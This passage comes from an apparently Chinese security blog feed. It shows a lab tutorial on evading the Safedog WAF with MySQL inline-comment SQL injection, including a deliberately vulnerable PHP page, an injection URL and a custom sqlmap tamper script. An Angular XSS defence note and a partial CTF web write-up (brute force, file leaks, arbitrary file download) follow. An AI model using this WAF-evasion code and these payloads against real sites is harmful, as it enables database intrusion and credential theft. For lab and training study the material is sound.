&amp;lt;?php include_once(&amp;#34;./config/config_db.php&amp;#34;); include_once(&amp;#34;./config/db_init.php&amp;#34;); $db = new DB($config); $id = $_GET[&amp;#34;id&amp;#34;]; if (isset($id)){ $sql= &amp;#34;select user_name,email,password from ecs_admin_user where user_id = {$id}&amp;#34;; echo $sql.&amp;#34;&amp;lt;br&amp;gt;&amp;#34;; @$result = $db-&amp;gt;select($sql); if (count($result[0])&amp;gt;1){ echo $result[0][0].&amp;#34; okokok&amp;lt;br&amp;gt;&amp;#34;; echo $result[0][1].&amp;#34;&amp;lt;br&amp;gt;&amp;#34;; echo $result[0][2].&amp;#34;&amp;lt;br&amp;gt;&amp;#34;; }else{ echo &amp;#34;fuck&amp;#34;; } } ?&amp;gt;  本地搭建的环境尝试
http://192.168.56.101/show.php?id=1/**!5000xxx**/and/**!50000xxx**/1/**!50000xxx**/=1 好了,知道安全狗对关键词之间检测那么我们可以在其空白字符和= ()这些字符之间插入我们这个注释来绕过
tamper的编写 我们观察sqlmap自带的tamper来观察如何绕过</description>
			<content type="html"><![CDATA[

<h1 id="前言">前言</h1>

<p>最近在学习waf的绕过,中间遇到不同的坑,后来学习下<code>sqlmap</code>中<code>tamper</code>的写法,膜拜sqlmap的作者,
<code>tamper</code>的写法很丰富,也很方便</p>

<h2 id="安全狗的绕过">安全狗的绕过</h2>

<p>自己本地搭建了最新版本的安全狗,利用<code>mysql</code>的内联注释,继续bypass</p>

<h3 id="环境准备">环境准备</h3>

<ul>
<li>PHP    5.4.5</li>
<li>Mysql  5.5</li>
<li>Apache 2.2.0</li>
</ul>

<p>利用替换空白字符<code>&quot; &quot; == &quot;/**!50000xxx**/&quot;</code>的方法 bypass</p>

<p>注入源码 show.php</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="k">include_once</span><span class="p">(</span><span class="s2">&#34;./config/config_db.php&#34;</span><span class="p">);</span>
<span class="k">include_once</span><span class="p">(</span><span class="s2">&#34;./config/db_init.php&#34;</span><span class="p">);</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DB</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">];</span>

<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
	<span class="nv">$sql</span><span class="o">=</span> <span class="s2">&#34;select user_name,email,password from ecs_admin_user where user_id = </span><span class="si">{</span>$id<span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
	<span class="k">echo</span> <span class="nv">$sql</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
	<span class="o">@</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
	<span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; okokok&lt;br&gt;&#34;</span><span class="p">;</span>
	<span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
	<span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="k">echo</span> <span class="s2">&#34;fuck&#34;</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>
<p>本地搭建的环境尝试</p>

<p><code>http://192.168.56.101/show.php?id=1/**!5000xxx**/and/**!50000xxx**/1/**!50000xxx**/=1</code>
<img src="http://image.3001.net/images/20180809/15338057453159.png" alt="" /></p>

<p>好了,知道安全狗对关键词之间检测那么我们可以在其空白字符和= ()这些字符之间插入我们这个注释来绕过</p>

<h2 id="tamper的编写">tamper的编写</h2>

<p>我们观察<code>sqlmap</code>自带的<code>tamper</code>来观察如何绕过</p>

<p><code>tamper /space2comment.py</code></p>
<div class="highlight"><pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
</span><span class="s2">See the file &#39;LICENSE&#39; for copying permission
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>

<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>

<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>  <span class="c1">#这里可以看到传入的payload进行字符替换或增加</span>
    <span class="s2">&#34;&#34;&#34;
</span><span class="s2">    Replaces (MySQL) instances of space character (&#39; &#39;) with comments &#39;/**_**/&#39;
</span><span class="s2">
</span><span class="s2">    Tested against:
</span><span class="s2">        * MySQL 5.0 and 5.5
</span><span class="s2">
</span><span class="s2">    Notes:
</span><span class="s2">        * Useful to bypass weak and bespoke web application firewalls
</span><span class="s2">
</span><span class="s2">    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
</span><span class="s2">    &#39;SELECT/**_**/id/**_**/FROM/**_**/users&#39;
</span><span class="s2">    &#34;&#34;&#34;</span>

    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>

    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span> <span class="c1">#首个字符替换,双引号,</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
                    <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**_**/&#34;</span> <span class="c1">#替换为 &#34;/**_**/&#34;</span>
                    <span class="k">continue</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**_**/&#34;</span>
                <span class="k">continue</span>

            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">retVal</span></code></pre></div>
<p>看了以后我们就知道了该怎么做了,因此这是我编写的<code>tamper</code></p>
<div class="highlight"><pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
</span><span class="s2">See the file &#39;doc/COPYING&#39; for copying permission
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>

<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>

<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="s2">&#34;&#34;&#34;
</span><span class="s2">    Replaces space character (&#39; &#39;) with comments &#39;/**/&#39;
</span><span class="s2">
</span><span class="s2">    Tested against:
</span><span class="s2">        * MySQL &gt; 5.1
</span><span class="s2">
</span><span class="s2">    Notes:
</span><span class="s2">        * Useful to bypass weak and bespoke web application firewalls
</span><span class="s2">
</span><span class="s2">    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
</span><span class="s2">    &#39;SELECT/**!50000xxx**/id/**!50000xxx**/FROM/**!50000xxx**/users&#39;
</span><span class="s2">    &#34;&#34;&#34;</span>

    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>

    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span>
        <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;DATABASE&#34;</span><span class="p">,</span> <span class="s2">&#34;SCHEMA&#34;</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
                    <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/&#34;</span>
                    <span class="k">continue</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/&#34;</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;=&#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/=&#34;</span>
            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;(&#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&#34;/**!50000xxx**/(&#34;</span>
                <span class="k">continue</span>

            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>



    <span class="k">return</span> <span class="n">retVal</span></code></pre></div>
<p>附上自己sqlmap的截图
<img src="http://image.3001.net/images/20180809/15338072328221.png" alt="" /></p>

<h3 id="参考来源">参考来源</h3>

<p><a href="https://www.secquan.org/Share/1045">https://www.secquan.org/Share/1045</a></p>
]]></content>
		</item>
		
		<item>
			<title>Angular-xss</title>
			<link>/posts/hello/</link>
			<pubDate>Thu, 05 Apr 2018 21:49:57 -0700</pubDate>
			
			<guid>/posts/hello/</guid>
			<description>Angular-xss防护  为了系统性的防范 XSS 问题，Angular 默认把所有值都当做不可信任的。 当值从模板中以属性（Property）、DOM 元素属性（Attribte)、CSS 类绑定或插值表达式等途径插入到 DOM 中的时候， Angular 将对这些值进行无害化处理（Sanitize），对不可信的值进行编码。 Angular 定义了四个安全环境 - HTML，样式，URL，和资源 URL：
  HTML：值需要被解释为 HTML 时使用，比如当绑定到 innerHTML 时。 样式：值需要作为 CSS 绑定到 style 属性时使用。 URL：值需要被用作 URL 属性时使用，比如 &amp;lt;a href&amp;gt;。 资源 URL的值需要作为代码进行加载并执行，比如 &amp;lt;script src&amp;gt; 中的 URL。  Angular 会对前三项中种不可信的值进行无害化处理，但不能对第四种资源 URL 进行无害化，因为它们可能包含任何代码。在开发模式下， 如果在进行无害化处理时需要被迫改变一个值，Angular 就会在控制台上输出一个警告。
example &amp;lt;h3&amp;gt;Binding innerHTML&amp;lt;/h3&amp;gt; &amp;lt;p&amp;gt;Bound value:&amp;lt;/p&amp;gt; &amp;lt;p class=&amp;#34;e2e-inner-html-interpolated&amp;#34;&amp;gt;{{htmlSnippet}}&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;Result of binding to innerHTML:&amp;lt;/p&amp;gt; &amp;lt;p class=&amp;#34;e2e-inner-html-bound&amp;#34; [innerHTML]=&amp;#34;htmlSnippet&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;export class InnerHtmlBindingComponent { // For example, a user/attacker-controlled value from a URL.</description>
			<content type="html"><![CDATA[

<h2 id="angular-xss防护">Angular-xss防护</h2>

<blockquote>
<p>为了系统性的防范 XSS 问题，Angular 默认把所有值都当做不可信任的。 当值从模板中以属性（Property）、DOM 元素属性（Attribte)、CSS 类绑定或插值表达式等途径插入到 DOM 中的时候， Angular 将对这些值进行无害化处理（Sanitize），对不可信的值进行编码。
Angular 定义了四个安全环境 - HTML，样式，URL，和资源 URL：</p>
</blockquote>

<ul>
<li>HTML：值需要被解释为 HTML 时使用，比如当绑定到 innerHTML 时。</li>
<li>样式：值需要作为 CSS 绑定到 style 属性时使用。</li>
<li>URL：值需要被用作 URL 属性时使用，比如 <code>&lt;a href&gt;</code>。</li>
<li>资源 URL的值需要作为代码进行加载并执行，比如 <code>&lt;script src&gt;</code> 中的 URL。</li>
</ul>

<p>Angular 会对前三项中种不可信的值进行无害化处理，但不能对第四种资源 URL 进行无害化，因为它们可能包含任何代码。在开发模式下， 如果在进行无害化处理时需要被迫改变一个值，Angular 就会在控制台上输出一个警告。</p>

<h2 id="example">example</h2>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Binding innerHTML<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Bound value:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;e2e-inner-html-interpolated&#34;</span><span class="p">&gt;</span>{{htmlSnippet}}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Result of binding to innerHTML:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;e2e-inner-html-bound&#34;</span> <span class="err">[</span><span class="na">innerHTML</span><span class="err">]=&#34;</span><span class="na">htmlSnippet</span><span class="err">&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="k">export</span> <span class="k">class</span> <span class="nx">InnerHtmlBindingComponent</span> <span class="p">{</span>
  <span class="c1">// For example, a user/attacker-controlled value from a URL.
</span><span class="c1"></span>  <span class="nx">htmlSnippet</span> <span class="o">=</span> <span class="s1">&#39;Template &lt;script&gt;alert(&#34;0wned&#34;)&lt;/script&gt; &lt;b&gt;Syntax&lt;/b&gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p><img src="https://angular.cn/generated/images/guide/security/binding-inner-html.png" alt="" /></p>

<p><a href="https://angular.cn/guide/security#offline-template-compiler">Angular - 安全</a></p>

<blockquote>
<p>目前存在的逃逸姿势</p>
</blockquote>

<p><a href="https://seaii-blog.com/index.php/2017/09/02/68.html">AngularJS沙盒逃逸姿势总结 - Seaii&rsquo;s Blog</a></p>

<p><img src="https://image.3001.net/images/20190410/15548669847528.png" alt="" /></p>

<h2 id="json数据过滤">JSON数据过滤</h2>

<p>OWASP json过滤一遍
<a href="https://github.com/owasp/json-sanitizer">GitHub - OWASP/json-sanitizer: Given JSON-like content, The JSON Sanitizer converts it to valid JSON.</a></p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json">            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34;&gt;&#34;</span><span class="err">,</span> <span class="s2">&#34;&amp;gt;&#34;</span><span class="err">);</span>  
            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34;&lt;&#34;</span><span class="err">,</span> <span class="s2">&#34;&amp;lt;&#34;</span><span class="err">);</span>  
            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34; &#34;</span><span class="err">,</span> <span class="s2">&#34;&amp;nbsp;&#34;</span><span class="err">);</span>  
            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34;\&#34;&#34;</span><span class="err">,</span> <span class="s2">&#34;&amp;quot;&#34;</span><span class="err">);</span>  
            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34;\&#39;&#34;</span><span class="err">,</span> <span class="s2">&#34;&amp;#39;&#34;</span><span class="err">);</span>  
            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34;\\&#34;</span><span class="err">,</span> <span class="s2">&#34;\\\\&#34;</span><span class="err">);//对斜线的转义</span>  
            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34;\n&#34;</span><span class="err">,</span> <span class="s2">&#34;\\n&#34;</span><span class="err">);</span>  <span class="err">//注意php中替换的时候只能用双引号</span><span class="s2">&#34;\n&#34;</span>
            <span class="err">theString</span> <span class="err">=</span> <span class="err">theString.Replace(</span><span class="s2">&#34;\r&#34;</span><span class="err">,</span> <span class="s2">&#34;\\r&#34;</span><span class="err">);</span>  </code></pre></div>]]></content>
		</item>
		
		<item>
			<title>某平台ctf Web</title>
			<link>/posts/%E6%9F%90%E5%B9%B3%E5%8F%B0ctf-web/</link>
			<pubDate>Mon, 26 Mar 2018 10:42:51 +0800</pubDate>
			
			<guid>/posts/%E6%9F%90%E5%B9%B3%E5%8F%B0ctf-web/</guid>
			<description>web题目wp web-1 送分题 题目地址 http://45.124.115.155:8002/bd6b406e7ab5ca24/
访问得知是一个登录框，我们右键查看源代码得到重要信息 可以得到此登录框用户名是amdin，密码from（month/day）因此猜想密码来自日期，构造字典为所有的日期天数爆破，后来爆破无果，换成4位数字就可以，burpsite设置参数类型 爆破得出密码为 9527 因此获得flag为：flag{brute_force_attack97dsads}
web-2 信息泄露 题目地址 http://45.124.115.155:8007/28bc0902b253f1ca/
题目提示信息泄露，因此我们尝试找下敏感信息泄露的文件，用御剑或者别的工具扫描得到一个 www.rar
我们访问下载，得到文件内容____查看info.txt 题目提示vim退出产生的临时文件，即vim产生临时的swp文件，因此我们访问 config,inc.swp这个文件
拿到flag flag{8622EFE3BADA2CC28622EFE3BADA2CC2}
web-3 抓包 题目打开后是一个链接，我们访问发现链接跳转到404，利用chrome浏览器f12开发者工具得到 我们使用burpsite抓包访问
得到加密字符串，经过分析是base64加密，解密得到 flag为 flag{Redirection302}
web-4 会编程吗 题目打开让我们下载文件 但是分析下载文件的链接 http://45.124.115.155:8002/732a68da659cba5b/?file=flag.txt 发现存在任意文件下载，构造链接
http://45.124.115.155:8002/732a68da659cba5b/?file=flag.php
下载得到flag.php文件，打开发现内容如下:
&amp;lt;?php header(&amp;#39;Content-Type: text/html; charset=utf-8&amp;#39;); function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &amp;lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .</description>
			<content type="html"><![CDATA[

<h1 id="web题目wp">web题目wp</h1>

<h2 id="web-1-送分题">web-1 送分题</h2>

<p>题目地址 <a href="http://45.124.115.155:8002/bd6b406e7ab5ca24/">http://45.124.115.155:8002/bd6b406e7ab5ca24/</a></p>

<p>访问得知是一个登录框，我们右键查看源代码得到重要信息
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/3980a86f.png" alt="3980a86f.png" />
可以得到此登录框用户名是amdin，密码from（month/day）因此猜想密码来自日期，构造字典为所有的日期天数爆破，后来爆破无果，换成4位数字就可以，burpsite设置参数类型
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/b4d7f102.png" alt="b4d7f102.png" />
爆破得出密码为 <code>9527</code>
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/8fcdb483.png" alt="8fcdb483.png" />
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/7339320c.png" alt="7339320c.png" />
因此获得flag为：<code>flag{brute_force_attack97dsads}</code></p>

<h2 id="web-2-信息泄露">web-2 信息泄露</h2>

<p>题目地址 <a href="http://45.124.115.155:8007/28bc0902b253f1ca/">http://45.124.115.155:8007/28bc0902b253f1ca/</a></p>

<p>题目提示信息泄露，因此我们尝试找下敏感信息泄露的文件，用御剑或者别的工具扫描得到一个 www.rar</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/c4b0dbdb.png" alt="c4b0dbdb.png" />我们访问下载，得到文件内容____<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ba0bef95.png" alt="ba0bef95.png" /></p>

<p>查看info.txt 题目提示vim退出产生的临时文件，即vim产生临时的swp文件，因此我们访问 config,inc.swp这个文件</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/0729e0e7.png" alt="0729e0e7.png" /></p>

<p>拿到flag <code>flag{8622EFE3BADA2CC28622EFE3BADA2CC2}</code></p>

<h2 id="web-3-抓包">web-3 抓包</h2>

<p>题目打开后是一个链接，我们访问发现链接跳转到404，利用chrome浏览器f12开发者工具得到
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/badb2263.png" alt="badb2263.png" /></p>

<p>我们使用burpsite抓包访问</p>

<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/64d6bb64.png" alt="64d6bb64.png" /></p>

<p>得到加密字符串，经过分析是base64加密，解密得到
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/16503a1e.png" alt="16503a1e.png" /></p>

<p>flag为 <code>flag{Redirection302}</code></p>

<h2 id="web-4-会编程吗">web-4 会编程吗</h2>

<p>题目打开让我们下载文件
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/78e44e86.png" alt="78e44e86.png" /></p>

<p>但是分析下载文件的链接
<a href="http://45.124.115.155:8002/732a68da659cba5b/?file=flag.txt">http://45.124.115.155:8002/732a68da659cba5b/?file=flag.txt</a>
发现存在任意文件下载，构造链接</p>

<p><a href="http://45.124.115.155:8002/732a68da659cba5b/?file=flag.php">http://45.124.115.155:8002/732a68da659cba5b/?file=flag.php</a></p>

<p>下载得到<code>flag.php</code>文件，打开发现内容如下:</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html; charset=utf-8&#39;</span><span class="p">);</span> 
<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
	<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nv">$len</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
	<span class="nv">$l</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$x</span> <span class="o">==</span> <span class="nv">$l</span><span class="p">)</span> <span class="p">{</span>
			<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nv">$char</span> <span class="o">.=</span> <span class="nv">$key</span> <span class="p">{</span><span class="nv">$x</span><span class="p">};</span>
		<span class="nv">$x</span> <span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$str</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">{</span><span class="nv">$i</span><span class="p">}</span> <span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">ord</span> <span class="p">(</span> <span class="nv">$char</span> <span class="p">{</span><span class="nv">$i</span><span class="p">}</span> <span class="p">))</span> <span class="o">%</span> <span class="mi">256</span> <span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nx">base64_encode</span> <span class="p">(</span> <span class="nv">$str</span> <span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
	<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
	<span class="nv">$len</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$data</span> <span class="p">);</span>
	<span class="nv">$l</span> <span class="o">=</span> <span class="nx">strlen</span> <span class="p">(</span> <span class="nv">$key</span> <span class="p">);</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$x</span> <span class="o">==</span> <span class="nv">$l</span><span class="p">)</span> <span class="p">{</span>
			<span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="p">}</span>
